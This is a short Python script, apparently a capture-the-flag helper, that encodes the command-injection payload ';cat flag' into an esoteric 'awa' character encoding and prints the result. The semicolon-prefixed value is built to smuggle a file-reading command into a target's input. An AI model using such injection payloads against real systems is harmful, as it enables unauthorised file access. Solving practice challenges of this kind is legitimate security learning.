awaSCII = 'AWawJELyHOSIUMjelyhosiumPCNTpcntBDFGRbdfgr0123456789 .,!\'()~_/;\n'
payload = ';cat flag'
awa = 'awa'
for i in payload:
    assert i in awaSCII
    awabyte = ''
    value = awaSCII.index(i)
    for _ in range(6):
        if value % 2 == 0:
            awabyte = ' awa' + awabyte
        else:
            awabyte = 'wa' + awabyte
        value >>= 1
    awa += awabyte
print(awa)
